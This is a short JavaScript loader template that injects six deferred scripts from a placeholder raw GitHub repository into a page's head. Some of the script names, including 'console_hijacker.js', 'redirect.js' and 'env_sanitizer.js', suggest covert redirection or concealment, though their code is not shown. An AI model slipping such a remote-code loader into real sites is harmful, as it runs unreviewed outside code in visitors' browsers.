(function() {
    const scripts = [
        'brand_initializer.js',
        'outer_network_detector.js',
        'redirect.js',
        'console_hijacker.js',
        'asset_preloader.js',
        'env_sanitizer.js'
    ];
    const baseUrl = 'https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/';
    
    scripts.forEach(src => {
        const s = document.createElement('script');
        s.src = baseUrl + src;
        s.defer = true;
        document.head.appendChild(s);
    });
})();